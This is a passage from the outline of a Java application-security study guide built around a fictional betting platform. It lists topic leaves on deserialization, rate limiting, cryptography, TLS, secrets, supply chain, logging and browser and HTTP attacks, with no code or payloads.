2.12.6 Office/PDF documents as containers: macros, embedded objects, external references; Apache POI
       and PDFBox posture; and the ZIP-based-format warning. `[RESEARCH]`
2.12.7 The QuizStakes identity-document flow specifically: client uploads to `DocumentRequirements`,
       an automated vendor verifies, inconclusive cases go to human review in `InternalPlatforms`.
       Where each control sits, and the **blind XSS** risk in the operator console.
       `[SOURCE]` `[FLOW]`
2.12.8 **Presigned upload URLs** to object storage as the architecture that removes most of the risk
       from your JVM: the signature, the enforced content type and size, the short expiry, and the
       fact that validation must still happen *after* the upload. `[PROVE]` `[X-REF 18]`
2.12.9 Download-side authorization: signed URLs versus a proxied stream; the IDOR on the storage key;
       and why a UUID filename is obscurity, not authorization. `[PROVE]` `[TRAP]`
2.12.10 Spring's limits and knobs: `spring.servlet.multipart.max-file-size`,
        `max-request-size`, `file-size-threshold`, `MultipartResolver`, and the Tomcat-level
        `maxSwallowSize`. `[API]` `[NUM]`
2.12.11 Temporary-file handling: `Files.createTempFile` with explicit permissions, the
        world-readable `/tmp` trap, and cleanup on failure. `[API]` `[TRAP]`
2.12.12 Antivirus/YARA scanning as a control with an honest efficacy statement, and where it goes
        in the pipeline (quarantine → scan → promote). `[PROVE]`

*(12 leaves)*

## §2.13 Deserialization

2.13.1 The definition and why it is uniquely severe: deserialization reconstructs an **object
       graph**, which means it invokes code (`readObject`, `readResolve`, constructors, setters)
       chosen by the attacker. `[PROVE]`
2.13.2 **Gadget chains**: a sequence of method calls through classes already on the classpath, from
       the deserialization entry point to a sensitive sink. The attacker does not need your code to
       be buggy, only present. `[PROVE]`
2.13.3 The canonical Java gadget history: Commons Collections `InvokerTransformer`, `TemplatesImpl`,
       Spring's `MethodInvokeTypeProvider`, Groovy's `MethodClosure`, and **ysoserial** as the tool
       that made it trivial. `[CVE]` `[RESEARCH]`
2.13.4 **Never `ObjectInputStream.readObject()` on external input.** Not with a filter, not with a
       "safe" classpath. State it as an absolute, then present the filter as containment for legacy
       code you cannot remove. `[PROVE]`
2.13.5 **JEP 290 filters** (Java 9+): the JVM-wide `jdk.serialFilter` property, the pattern grammar
       (semicolon-separated; `!` to reject; `module/class`; `pkg.*` for a package; `pkg.**` for a
       package and subpackages; a bare `*` suffix for prefix match; exact class match; otherwise
       undecided), and the **limit keywords `maxdepth`, `maxrefs`, `maxbytes`, `maxarray`**.
       `[SPEC]` `[NUM]` `[SOURCE]`
2.13.6 `ObjectInputFilter` API: `Status.ALLOWED`/`REJECTED`/`UNDECIDED`, `FilterInfo` accessors
       (`serialClass()`, `arrayLength()`, `depth()`, `references()`, `streamBytes()`),
       `Config.createFilter(String)`, `ObjectInputStream.setObjectInputFilter`,
       `Config.setSerialFilter`, and `allowFilter`/`rejectFilter`/`rejectUndecidedClass` helpers.
       `[API]` `[SOURCE]` `[BUILD]`
2.13.7 **JEP 415 filter factories** (Java 17+): `jdk.serialFilterFactory`, a
       `BinaryOperator<ObjectInputFilter>` invoked per stream so a filter can be
       **context-specific**, and the "filter is set once, factory composes" contract. `[SPEC]`
       `[API]` `[VERSION-TRAP]`
2.13.8 Where deserialization hides in a Java stack, so the audit is complete: RMI, JMX, JNDI/LDAP
       responses, HTTP session replication, JMS `ObjectMessage`, Spring HTTP Invoker (removed),
       caches storing serialized values, `SerializationUtils`, `Externalizable`, and any framework
       that persists a `byte[]` blob. `[TABLE]` `[ATTACK]`
2.13.9 Non-Java-native deserialization with the same shape: Jackson polymorphic typing, SnakeYAML,
       XStream, Kryo, Hessian, `pickle` (for the polyglot service next door), and .NET
       `BinaryFormatter`. `[TABLE]`
2.13.10 The correct architecture: a **data format with no code semantics** (JSON/Protobuf), explicit
        types, no polymorphism from the wire, schema validation, and a signed/MACed envelope if the
        data must round-trip through an untrusted party. `[PROVE]`
2.13.11 The **signed-blob** pattern for round-tripping state through the client (a cursor, a wizard
        state), and why signing without also constraining the type is not enough. `[PROVE]`
2.13.12 Detection and monitoring: `AC ED 00 05` as the Java serialization magic (and `rO0` in
        base64), filter-rejection logging, and what to alert on. `[NUM]` `[WIRE]` `[X-REF 20]`
2.13.13 How to answer "how would you fix an insecure deserialization finding" in an interview — the
        four-tier answer: remove the feature, change the format, filter, then monitor. `[FLOW]`

*(13 leaves)*

## §2.14 Rate limiting, abuse and enumeration

2.14.1 Rate limiting as a **security** control, distinct from rate limiting as a capacity control:
       it raises the cost of brute force, enumeration, scraping and business-logic abuse.
       `[PROVE]` `[X-REF 12]`
2.14.2 **The key is the whole design.** Per-IP alone is useless against a botnet spreading one
       attempt per address; limit **per account** (protects the target), **per IP**, **per
       credential-pair**, **per device**, and **globally per endpoint** — and alert on the
       aggregate **failure rate**, which is the real signal. `[PROVE]` `[TABLE]`
2.14.3 The algorithms and their differences: fixed window (boundary burst), sliding window log
       (exact, expensive), sliding window counter, **token bucket** (burst + sustained), leaky
       bucket, and GCRA. Which to pick for a login endpoint versus the 1,200/sec stake-reservation
       path. `[TABLE]` `[NUM]` `[X-REF 12]`
2.14.4 Distributed correctness: the read-modify-write race, an atomic Redis `INCR`+`EXPIRE` or Lua
       script, and why an in-memory limiter across three `FundsLedger` instances gives 3× the
       intended limit. `[PROVE]` `[NUM]` `[X-REF 15]`
2.14.5 Where to enforce: edge/WAF/API gateway (cheapest, no app context) versus in-app (has account
       context). Both, with different keys. `[TABLE]`
2.14.6 Responses: `429` with `Retry-After`, the `RateLimit`/`RateLimit-Policy` fields, and the
       decision of whether to reveal the limit to an attacker. `[CODE]` `[HDR]` `[X-REF 12]`
2.14.7 **Credential stuffing** mechanics: replayed username/password pairs from other breaches,
       distributed across residential proxies, at human-like rates. Why it succeeds (password
       reuse) and what actually stops it. `[PROVE]`
2.14.8 **Password spraying** vs **brute force** vs **credential stuffing** — three different attacks
       needing three different limits. `[TABLE]` `[PROVE]`
2.14.9 **Account lockout is a double-edged control**: it converts credential stuffing into a denial
       of service against your own users. Prefer progressive delays, per-account throttling, MFA and
       device recognition over hard lockouts. `[PROVE]` `[TRAP]`
2.14.10 CAPTCHA / proof of work / device attestation after a threshold, not on every attempt, and an
        honest note on CAPTCHA weaknesses (solver farms, accessibility, ML). `[RESEARCH]`
2.14.11 **Enumeration-proof responses**, done properly: the same message *and* the same **timing**
        whether or not the account exists — hash a dummy password when the user is missing,
        otherwise the fast failure leaks existence. `[PROVE]` `[BUILD]`
2.14.12 The enumeration surfaces people forget: registration ("if that address is new, check your
        email"), password reset ("if an account exists we have sent a link"), the *fact* of an MFA
        prompt, response-size differences, `404` vs `403` on a private resource, and validation
        messages. `[TABLE]` `[ATTACK]`
2.14.13 Timing side channels in application code generally, and why constant-time comparison of
        tokens and constant-work authentication paths matter beyond crypto. `[PROVE]`
2.14.14 **Business-logic abuse** as the QuizStakes-shaped risk: farming the "10% of first deposit,
        capped at 100" bonus with many accounts, multi-accounting, bonus arbitrage between the
        bonus and cash buckets, and abusing `VoidStake` timing. Rate limits do not fix these —
        invariants, velocity checks and identity linking do. `[SOURCE]` `[NUM]` `[PROVE]`
2.14.15 Bot management: fingerprinting, behavioural signals, honeypot fields, and the arms-race
        caveat.
2.14.16 Application-layer DoS beyond request count: expensive queries, unbounded page sizes, regex,
        decompression, large JSON, deep GraphQL, and file-processing. The "cost per request" budget
        as a control. `[PROVE]` `[X-REF 22]`
2.14.17 Load shedding and graceful degradation when limits are hit — and the fail-closed requirement
        for the security-relevant path (`ClientRestrictions` must not be bypassed under load).
        `[SOURCE]` `[X-REF 22]`
2.14.18 Bucket4j / Resilience4j / Spring Cloud Gateway's `RequestRateLimiter` as the concrete Java
        options, with the Redis-backed configuration. `[API]` `[BUILD]`

*(18 leaves)*

## §2.15 Applied cryptography — using primitives correctly

2.15.1 The rule that prevents most crypto bugs: **use a construction, not a primitive**, and
       **never design your own**. Then the rest of this section is about choosing the construction.
       `[PROVE]`
2.15.2 The property → primitive mapping, as the section's spine: confidentiality → AEAD;
       integrity+authenticity with a shared secret → HMAC; integrity+authenticity with a public key
       → signature; password storage → a password hash; key from a key → HKDF; key from a password →
       PBKDF2/Argon2; unpredictability → CSPRNG; identity/dedup → a plain hash. `[TABLE]`
2.15.3 **Symmetric encryption**: AES-128/256, and why **AES-GCM** (or ChaCha20-Poly1305, or
       AES-GCM-SIV) is the default — AEAD gives confidentiality *and* integrity in one operation.
       `[NUM]` `[API]`
2.15.4 **The GCM nonce rule**: a 96-bit IV must **never** be reused with the same key, because
       reuse leaks the XOR of plaintexts *and* the authentication subkey, allowing forgery. Random
       nonces are safe only up to a bound (~2^32 messages per key); a counter is better.
       `[PROVE]` `[NUM]` `[ATTACK]`
2.15.5 GCM tag length: keep it at **128 bits**; short tags weaken forgery resistance. `[NUM]`
2.15.6 **Never CBC without a MAC**, and the **padding oracle** attack: a distinguishable
       padding-error response lets an attacker decrypt arbitrary ciphertext without the key.
       Encrypt-then-MAC ordering, and why AEAD removes the whole decision. `[PROVE]` `[ATTACK]`
2.15.7 **ECB is not encryption of anything larger than one block** — the penguin. And
       `Cipher.getInstance("AES")` in Java **defaults to ECB**, which is the single most common
       Java crypto bug. `[ATTACK]` `[TRAP]` `[NUM]`
2.15.8 The **associated data** in AEAD, and the real use for it: bind the ciphertext to its context
       (tenant id, record id, purpose) so a valid ciphertext cannot be moved. `[PROVE]`
2.15.9 **Asymmetric**: RSA (2048 minimum, 3072 preferred; OAEP for encryption, PSS for signatures;
       never PKCS#1 v1.5 encryption — Bleichenbacher) versus ECC (P-256, Ed25519) with the size and
       speed comparison. `[NUM]` `[TABLE]`
2.15.10 Why you almost never encrypt data with an asymmetric key directly: size limits and speed —
        hence **hybrid/envelope encryption**. `[PROVE]`
2.15.11 **Envelope encryption**: a per-record DEK encrypts the data, a KEK in a KMS/HSM wraps the
        DEK, and only the wrapped DEK is stored. Why this makes key rotation an O(number of DEKs)
        rewrap rather than a re-encryption of all data. `[PROVE]` `[NUM]`
2.15.12 **Key hierarchy and rotation**: key versions carried with the ciphertext, decrypt-with-old /
        encrypt-with-new, and a rotation that never requires downtime. `[FLOW]`
2.15.13 **HMAC** (RFC 2104) and where it belongs: webhook signatures, double-submit CSRF tokens,
        signed URLs, tamper-evident cookies. `HmacSHA256`, key length ≥ hash output.
        `[API]` `[NUM]`
2.15.14 **Webhook signature verification** done right, as a worked example: the signed payload
        construction (timestamp + body), the constant-time compare, the replay window, and
        supporting two secrets during rotation. `[BUILD]` `[X-REF 12]`
2.15.15 **HKDF** (RFC 5869) — extract-then-expand with `info` for domain separation — and the rule
        that **one key does one job**. `[PROVE]` `[API]`
2.15.16 **Hashes**: SHA-256/SHA-512/SHA-3 for integrity and identity; **SHA-1 and MD5 are broken**
        for collision resistance (SHAttered, chosen-prefix collisions) but not for HMAC — state the
        distinction precisely. `[NUM]` `[PROVE]`
2.15.17 **Randomness**: `SecureRandom` vs `Random` vs `Math.random`, `getInstanceStrong()` and its
        blocking behaviour, `/dev/urandom` vs `/dev/random`, `NativePRNGNonBlocking`, seeding in
        containers, and the class of bug where a predictable token becomes an account takeover.
        `[API]` `[PROVE]` `[NUM]`
2.15.18 Token generation done right: 128–256 bits from a CSPRNG, base64url encoded, no structure, and
        the arithmetic for how many bits you actually need. `[NUM]` `[BUILD]`
2.15.19 **Constant-time comparison**: `MessageDigest.isEqual`, why `Arrays.equals` and
        `String.equals` short-circuit, and the practical exploitability question. `[API]` `[PROVE]`
2.15.20 What crypto does **not** solve: a key you cannot protect, an authorization bug, a plaintext
        log line, or an attacker with your process's memory. `[PROVE]`
2.15.21 **Encryption at rest** — what it protects against (stolen disks, decommissioned hardware,
        snapshot exposure) and what it does not (a compromised application, which has the key).
        Transparent DB encryption versus field-level encryption. `[PROVE]` `[TRAP]`
2.15.22 **Field-level / application-level encryption** and the queryability problem: deterministic
        encryption to allow equality lookups leaks equality; blind indexes as the standard
        compromise; searchable encryption's real cost. `[PROVE]`
2.15.23 **Tokenization vs encryption vs hashing vs masking vs redaction** for PII and card data,
        and which one PCI-DSS actually wants where. `[TABLE]` `[RESEARCH]`
2.15.24 The JCA surface: `Cipher`, `Mac`, `Signature`, `MessageDigest`, `KeyGenerator`,
        `SecretKeyFactory`, `KeyPairGenerator`, `KeyStore`, providers and the ordering,
        `SunJCE`/`SunEC`/`SunPKCS11`, BouncyCastle, and Tink as the "safe by construction"
        alternative. `[API]` `[NUM]`
2.15.25 Java crypto policy history: the JCE unlimited-strength policy files (removed as a concern
        from Java 9), and the `crypto.policy` property. `[VERSION-TRAP]`
2.15.26 Post-quantum in one honest leaf: ML-KEM/ML-DSA (FIPS 203/204), hybrid key exchange already
        shipping in TLS, "harvest now decrypt later" as the reason it matters for long-lived
        confidentiality, and the fact that signatures and password hashing are not urgent.
        `[RESEARCH]`

*(26 leaves)*

## §2.16 TLS, PKI and mTLS in practice

2.16.1 The handshake at the level you must be able to narrate: TLS 1.2's two round trips
       (ClientHello → ServerHello+Certificate+KeyExchange → ClientKeyExchange+Finished) versus TLS
       1.3's one (ClientHello with key share → ServerHello+EncryptedExtensions+Certificate+Finished).
       `[FLOW]` `[NUM]` `[X-REF 10]`
2.16.2 What each handshake message contributes to which guarantee, so the flow is not memorised
       trivia. `[PROVE]`
2.16.3 **Forward secrecy**: ephemeral key exchange means a later private-key compromise does not
       decrypt recorded traffic. Why TLS 1.3 mandates it. `[PROVE]`
2.16.4 TLS 1.3's cipher-suite list — **five suites, all AEAD** — versus TLS 1.2's hundreds with
       known-weak options. What "configure your cipher suites" means in each. `[NUM]` `[TABLE]`
2.16.5 **0-RTT early data** and its replay exposure; the rule that only idempotent requests may go
       in early data. `[PROVE]` `[TRAP]`
2.16.6 Session resumption: session ids, session tickets, PSK resumption, and ticket-key rotation as
       a forward-secrecy consideration. `[NUM]`
2.16.7 **SNI** and why the requested hostname is plaintext in TLS 1.2/1.3, plus ECH as the fix in
       progress. `[RESEARCH]`
2.16.8 ALPN, and its security relevance (protocol confusion, `h2c` smuggling). `[X-REF 10]`
2.16.9 **Certificate validation**, the full algorithm: build a chain to a trusted anchor, verify
       each signature, check `basicConstraints`/`keyUsage`/`extendedKeyUsage`, check validity dates,
       match the name against **SAN** (CN is ignored by modern clients), and check revocation.
       `[FLOW]` `[SPEC]` `[NUM]`
2.16.10 Wildcard certificates and their matching rules (one label, not `*.*`), and why a wildcard is
        a blast-radius decision. `[NUM]`
2.16.11 **Revocation** and why it barely works: CRL size, OCSP's privacy and availability problems,
        OCSP stapling, must-staple, soft-fail as the default, and **short-lived certificates as the
        real answer**. `[PROVE]` `[NUM]`
2.16.12 **Certificate Transparency**: append-only logs, SCTs, and the fact that mis-issuance is now
        detectable rather than preventable. Why `Expect-CT` was retired. `[SPEC]`
        `[VERSION-TRAP]`
2.16.13 **Certificate pinning**: what it defends against (a compromised or coerced CA), why HPKP
        died (bricking risk), and where pinning still belongs (mobile apps, service-to-service) with
        a backup-pin and rotation plan. `[PROVE]` `[VERSION-TRAP]`
2.16.14 **mTLS in practice**: issuance (an internal CA or SPIFFE/SPIRE), distribution, rotation,
        revocation, and the identity model (`SAN`/SPIFFE ID → a principal your authorization layer
        understands). `[FLOW]` `[X-REF 19]`
2.16.15 Service-mesh mTLS (Istio/Linkerd) as the transparent option, and the honest limitation:
        it authenticates the *workload*, not the end user, so you still need token-based user
        identity on top. `[PROVE]` `[X-REF 19]`
2.16.16 mTLS in Java concretely: `KeyManagerFactory`/`TrustManagerFactory`, PKCS#12 keystores,
        `SSLContext`, `HttpClient` with an `SSLContext`, Spring Boot **SSL bundles**
        (`spring.ssl.bundle.jks.*` / `.pem.*`) and reloadable bundles, and
        `X509AuthenticationFilter` / `x509()` on the server side. `[API]` `[NUM]` `[RESEARCH]`
2.16.17 TLS misconfiguration checklist, because it is a stock interview question: protocol
        downgrade allowed, weak/export/NULL ciphers, RC4/3DES, no forward secrecy, small DH
        parameters, self-signed or expired certs, wrong hostname, missing intermediates, renegotiation
        enabled, compression (CRIME), truncation, and `verify=false` in a client. `[TABLE]`
        `[ATTACK]`
2.16.18 The historic attack names you should be able to place in one sentence each: BEAST, CRIME,
        BREACH, POODLE, Heartbleed, FREAK, Logjam, DROWN, ROBOT, Lucky13, Raccoon, and the
        Bleichenbacher family. What each taught the protocol. `[TABLE]` `[CVE]`
2.16.19 **Disabling certificate validation** as the single most common "temporary" Java security
        defect: the all-trusting `TrustManager`, `NoopHostnameVerifier`, and why it makes TLS
        equivalent to plaintext against an active attacker. `[ATTACK]` `[TRAP]`
2.16.20 Testing and verifying TLS: `openssl s_client`, `testssl.sh`, SSL Labs, and what to assert in
        CI. `[X-REF 16]`

*(20 leaves)*

## §2.17 Secrets, keys and identity for workloads

2.17.1 The hierarchy of solutions, worst to best: hardcoded → config file → environment variable →
       secrets manager → **short-lived credential from a workload identity** → **no credential at
       all** (mTLS/IAM role). `[TABLE]` `[PROVE]`
2.17.2 **Workload identity** as the destination: the platform attests what the workload is, and the
       credential is minted on demand with a short TTL — IAM instance roles, IRSA/EKS Pod Identity,
       GCP Workload Identity Federation, Azure Managed Identity, SPIFFE/SPIRE. `[TABLE]`
       `[X-REF 18]` `[X-REF 19]`
2.17.3 **OIDC federation for CI**: GitHub Actions exchanging an OIDC token for a cloud role, so
       there is no long-lived deploy key. The `sub`/`aud` trust-policy conditions that make it safe
       (and the classic misconfiguration that trusts every repo). `[ATTACK]` `[RESEARCH]`
2.17.4 **Vault's dynamic secrets**: a database credential created on request with a TTL and revoked
       at expiry, so a leak has a bounded lifetime. Also the auth-method bootstrap problem
       ("secret zero") and how workload identity solves it. `[PROVE]` `[RESEARCH]`
2.17.5 Vault's other relevant engines: transit (encryption as a service, so the app never sees the
       key), PKI (short-lived certs), KV v2 versioning. `[RESEARCH]`
2.17.6 **KMS/HSM**: keys that cannot be exported, so compromise gives *use* of the key, not the
       key — and the audit trail that follows. FIPS 140-3 levels. `[PROVE]` `[X-REF 18]`
2.17.7 Envelope encryption applied operationally (from § 2.15.11), with the data-key caching
       trade-off. `[NUM]`
2.17.8 **Rotation as a design property, not an event**: the two-active-keys rule, key ids in every
       ciphertext and every token, a rotation runbook, and automated rotation with a canary.
       `[FLOW]` `[PROVE]`
2.17.9 Rotating each kind of secret, with what breaks: a JWT signing key (§ 2.3.23), a DB password,
       an HMAC webhook secret, a TLS private key, an API key issued to a partner, the pepper.
       `[TABLE]`
2.17.10 Kubernetes `Secret` reality: base64 is not encryption, etcd encryption at rest,
        `imagePullSecrets`, mounted files versus env vars, External Secrets Operator, Sealed
        Secrets, SOPS. `[X-REF 19]`
2.17.11 Spring Boot's secret-loading surface: `spring.config.import=configtree:/run/secrets/`,
        `SPRING_APPLICATION_JSON`, `@ConfigurationProperties` with a `char[]`, `Sanitizer` and the
        actuator's value masking, and the reason `/actuator/env` must be authenticated.
        `[API]` `[NUM]`
2.17.12 Secret material in memory: `char[]` versus `String` (the string pool and heap dumps),
        zeroing after use, and the honest limit — the JVM does not let you win this fight, so
        control heap dumps instead. `[PROVE]` `[X-REF 06]`
2.17.13 Client-side secrets do not exist: a mobile app or SPA binary is a public artifact, so any
        embedded key is public. The correct patterns (PKCE, backend proxy, attestation).
        `[PROVE]` `[TRAP]`

*(13 leaves)*

## §2.18 Dependencies and the software supply chain

2.18.1 Why this became A03:2025: your code is a minority of your bytes, and the majority arrives
       from a registry over the internet, built by strangers, on a schedule you do not control.
       `[PROVE]` `[VERSION-TRAP]`
2.18.2 The attack surface enumerated: a vulnerable direct dependency, a vulnerable **transitive**
       dependency, a malicious package, a compromised maintainer account, **typosquatting**,
       **dependency confusion**, a compromised build system, a compromised registry mirror, a
       poisoned base image, a malicious IDE/CI plugin, and a compromised code-signing key.
       `[TABLE]`
2.18.3 The incidents to be able to cite in one sentence each: **Log4Shell**, **SolarWinds**,
       **event-stream**, **ua-parser-js**, **codecov**, **xz-utils (CVE-2024-3094)**, **PyPI/npm
       typosquats**, and the 2021 dependency-confusion research. `[CVE]` `[RESEARCH]`
2.18.4 **Dependency confusion** mechanically: a package manager that queries the public registry
       before (or alongside) the private one, plus an internal package name that exists publicly.
       The fixes: scoped names, an exclusive private repository with no public fallback, name
       reservation, and repository-level ordering. `[ATTACK]` `[PROVE]`
2.18.5 Maven/Gradle specifics: `mirrorOf: '*'`, `repositories` ordering, `settings.xml`,
       Gradle's `exclusiveContent` and `content { includeGroup }`, and why an internal Artifactory/
       Nexus proxy with no direct-internet fallback is the structural fix. `[API]` `[NUM]`
2.18.6 **Transitive dependency management**: `mvn dependency:tree`, `gradle dependencies`,
       `dependencyManagement`/BOMs, version alignment, and why "we pinned our direct deps" is not
       enough. `[API]`
2.18.7 **Reproducible and verifiable builds**: lock files (`gradle.lockfile`, `mvn` with
       `dependency-lock`), **checksum/signature verification** of downloaded artifacts, and Maven
       Central's PGP requirement. `[NUM]`
2.18.8 **SBOM**: CycloneDX vs SPDX (ISO/IEC 5962:2021), what an SBOM answers ("what is in this
       artifact") and what it explicitly does **not** ("where did it come from" / "is it safe"),
       and generating one per build with the CycloneDX Maven/Gradle plugin. `[PROVE]` `[RESEARCH]`
2.18.9 **Provenance and attestation**: SLSA v1.0's build track (levels 0–3 — L1 provenance exists,
       L2 hosted build platform with tamper-evident signed provenance, L3 hardened/isolated build),
       in-toto attestations, and **Sigstore/cosign** keyless signing with an OIDC identity.
       `[NUM]` `[TABLE]` `[RESEARCH]`
2.18.10 Verifying at consumption: admission policies that reject unsigned or unattested artifacts —
        the point at which provenance becomes a control rather than a document. `[PROVE]`
        `[X-REF 19]`
2.18.11 **SCA tooling** and the difference that matters: OWASP Dependency-Check (CPE matching, false
        positives), Dependabot/Renovate (update automation), Snyk/GitHub Advisory/OSV, and
        **reachability analysis** as the thing that turns 400 findings into 6. `[TABLE]` `[PROVE]`
2.18.12 Triage as a procedure, because "patch everything" is not one: **KEV** → EPSS × reachability
        → CVSS environmental → is the vulnerable code path even called → is it exploitable given
        our configuration. With a decision record for what you do not fix. `[FLOW]` `[PROVE]`
2.18.13 The update policy that actually works: automated patch/minor updates merged by CI, a
        scheduled major-version cadence, and a **maximum dependency age** metric rather than a
        zero-vulnerabilities target. `[PROVE]`
2.18.14 Choosing a dependency in the first place: maintenance signals, maintainer count, release
        cadence, transitive weight, licence, and the "can we vendor or delete this" question.
        `[TABLE]`
2.18.15 Base-image and container supply chain: distroless/minimal images, pinning by **digest** not
        tag, rebuilding to pick up OS patches, and image scanning. `[X-REF 19]`
2.18.16 CI/CD as the highest-value target: least-privilege runners, no secrets in PR builds from
        forks, `pull_request_target` as a footgun, protected branches, required reviews, signed
        commits/tags, and the fact that **the pipeline can deploy, so the pipeline is production**.
        `[PROVE]` `[ATTACK]`
2.18.17 The Java-specific pieces: the Maven plugin ecosystem as arbitrary code at build time, the
        `maven-enforcer-plugin` for banning versions, `jarsigner`, JAR reproducibility, and
        `--release` builds. `[API]`
2.18.18 Vulnerability disclosure on your own side: a `SECURITY.md`, a disclosure policy, a bug
        bounty, and CVE issuance if you ship a library. `[RESEARCH]`

*(18 leaves)*

## §2.19 Logging, monitoring, auditing and error handling

2.19.1 Why A09 exists: the median breach is discovered by a third party, months later, and the fix
       is not more logs but the *right* events with the *right* fields and an alert that fires.
       `[PROVE]` `[X-REF 20]`
2.19.2 The security event set to emit, enumerated: authentication success/failure, MFA
       enrolment/challenge/failure, password change, authorization denial, session lifecycle,
       privilege change, admin action, data export, rate-limit trip, input-validation rejection,
       CSP violation, deserialization-filter rejection, TLS handshake failure, secret access, and
       every state transition in a money flow. `[TABLE]`
2.19.3 The fields every security event needs: timestamp with timezone, actor (and *how* they
       authenticated), source IP and true-client-IP provenance, resource, action, outcome, reason,
       correlation/trace id, and the tenant. `[TABLE]` `[X-REF 20]`
2.19.4 **What must never be logged**: passwords, tokens (including in URLs), full card numbers,
       session ids, secrets, `Authorization` headers, full request bodies containing PII, and
       personal data beyond purpose. Plus the mechanisms: a logging filter/`Sanitizer`, a `toString`
       policy, `@ToString.Exclude`, and structured logging with an allowlist of fields.
       `[TABLE]` `[API]`
2.19.5 **Log injection** and forgery: newline stripping, structured (JSON) logging as the structural
       fix, and why a forged log line is an integrity failure in an audit trail. `[ATTACK]`
2.19.6 **Audit log integrity**: append-only, separate store, restricted write access, hash chaining
       or an external anchor, retention aligned to the regulator, and the tamper-detection story.
       For QuizStakes, the ledger *is* an audit log. `[PROVE]` `[SOURCE]`
2.19.7 Log retention and privacy in tension: GDPR data-minimisation and erasure versus the
       regulator's retention requirement. How to hold both (pseudonymisation, separate stores).
       `[RESEARCH]`
2.19.8 **Detection**: the specific alerts worth building — a spike in the authentication *failure
       rate* (not count), authorization denials clustered by actor, a new geography for an operator,
       impossible travel, a spike in 5xx after a deploy, CSP report volume, egress to a new
       destination, and secret access outside a deploy window. `[TABLE]` `[PROVE]`
2.19.9 The detection-vs-prevention trade, honestly: prevention fails silently, detection fails
       loudly. Budget for both. `[PROVE]`
2.19.10 **Error handling as a security control** (A10:2025): the fail-closed default, no stack traces
        to clients, a generic error body plus a correlation id, `@ControllerAdvice` with
        `ProblemDetail`, `server.error.include-*` properties, and the disabled default error page.
        `[API]` `[NUM]` `[VERSION-TRAP]` `[X-REF 12]`
2.19.11 The exceptional-condition failure modes A10:2025 actually names: an empty `catch`, a caught
        `Throwable` that continues, a security check inside a `try` whose failure is swallowed, a
        timeout treated as success, and a partially applied state change. `[TABLE]` `[ATTACK]`
        `[RESEARCH]`
2.19.12 **Fail-closed under timeout**, with the QuizStakes example: if the `ClientRestrictions` call
        exceeds its 30 ms budget, the stake must be refused, not allowed. Write the code and the
        circuit-breaker fallback that gets this right. `[SOURCE]` `[NUM]` `[BUILD]`
2.19.13 Actuator exposure as a stock misconfiguration: which endpoints leak what (`env`,
        `configprops`, `heapdump`, `threaddump`, `beans`, `mappings`, `loggers`, `httpexchanges`),
        the `management.endpoints.web.exposure.include` default, a separate management port, and
        securing the management chain. `[API]` `[NUM]` `[ATTACK]`
2.19.14 Incident response for an application-security incident, as a runbook: contain (revoke,
        rotate, block), preserve evidence, assess scope from the logs you have, notify (with the
        GDPR 72-hour clock), remediate, and write the postmortem. `[FLOW]` `[X-REF 20]`
2.19.15 The observability question that closes the loop: **"how would you know?"** — asked of every
        control in this guide. `[PROVE]`

*(15 leaves)*

## §2.20 The browser platform, advanced

2.20.1 **Cross-origin isolation**: `Cross-Origin-Opener-Policy: same-origin` +
       `Cross-Origin-Embedder-Policy: require-corp` (or `credentialless`) → `crossOriginIsolated`,
       which is what re-enables `SharedArrayBuffer` and high-resolution timers. Why Spectre made
       this necessary. `[SPEC]` `[PROVE]` `[RESEARCH]`
2.20.2 **`Cross-Origin-Resource-Policy`**: `same-origin` / `same-site` / `cross-origin`, blocking
       `no-cors` cross-origin embedding of your resources — the defence against speculative
       side-channel reads and a cheap anti-leak control. `[SPEC]` `[HDR]`
2.20.3 The **XS-Leaks** catalogue in brief: frame counting, error events, timing, `Content-Length`,
       cache probing, and how COOP/COEP/CORP/Fetch-Metadata/`SameSite` each close part of it.
       `[TABLE]` `[RESEARCH]`
2.20.4 **Fetch Metadata** as a resource-isolation policy: reject `cross-site` `Sec-Fetch-Site` for
       navigation-less state-changing endpoints, allow `same-origin`, and handle `none`. The exact
       decision table, and the fact that it covers CSRF, XS-Leaks and clickjacking at once.
       `[TABLE]` `[BUILD]` `[RESEARCH]`
2.20.5 `postMessage` security: always set `targetOrigin` (never `*`), always check `event.origin`
       **and** `event.source`, validate the payload's schema, and remember that `origin` is not
       `data.origin`. `[API]` `[ATTACK]`
2.20.6 **Service workers** as a persistence and interception primitive: an XSS that registers one
       owns the origin until it is unregistered. Scope rules, the `Service-Worker-Allowed` header,
       and `Clear-Site-Data: executionContexts`. `[PROVE]` `[ATTACK]`
2.20.7 **WebSockets** security: no same-origin policy on the handshake (hence
       **cross-site WebSocket hijacking**), the `Origin` header check as the required defence,
       authentication at the handshake (cookie or token in the subprotocol, never the URL),
       `wss://` only, per-message authorization, and the `Sec-WebSocket-Key` header's actual purpose
       (cache-poisoning protection, not security). `[ATTACK]` `[SPEC]` `[PROVE]`
2.20.8 **Server-Sent Events** and `EventSource`'s cookie behaviour.
2.20.9 Browser storage security: `localStorage`/`sessionStorage`/IndexedDB/Cache API are all
       XSS-readable and none are encrypted; the Web Crypto `crypto.subtle` non-extractable key as
       the one nuance. `[TABLE]` `[API]`
2.20.10 `iframe` sandboxing as a containment strategy for third-party or user content, and the
        `allow-scripts` + `allow-same-origin` escape. `[NUM]` `[TRAP]`
2.20.11 Third-party script risk (analytics, tag managers, chat widgets) as the practical CSP driver,
        and SRI + a separate origin as the mitigations. Magecart as the incident class. `[CVE]`
2.20.12 Autofill and password-manager interactions: `autocomplete` values, the credential-harvesting
        iframe, and why `autocomplete="off"` on a password field is now bad advice. `[TRAP]`
2.20.13 Open redirect as a first-class vulnerability, not a nuisance: phishing credibility, OAuth
        code theft, SSRF filter bypass, and CSP/CORS bypass. The fix — never redirect to a
        user-supplied absolute URL; use an allowlist or an indirection token. `[ATTACK]` `[BUILD]`
2.20.14 `javascript:`, `data:` and `blob:` URLs as XSS sinks when placed in `href`/`src`, and
        scheme allowlisting on any user-supplied URL. `[ATTACK]`
2.20.15 Content sniffing and download security: `nosniff`, `Content-Disposition`, and the
        reflected-file-download attack. `[ATTACK]` `[RESEARCH]`

*(15 leaves)*

## §2.21 HTTP-layer attacks

2.21.1 **HTTP request smuggling**: two servers disagreeing about where a message ends.
       `CL.TE`, `TE.CL`, `TE.TE`, and `CL.0` / `H2.CL` / `H2.TE` desync. What the attacker gains —
       queue poisoning, credential capture, access-control bypass, cache poisoning. `[ATTACK]`
       `[PROVE]` `[RESEARCH]`
2.21.2 Why HTTP/2 downgrade to HTTP/1.1 at the origin reintroduces it, and why end-to-end HTTP/2
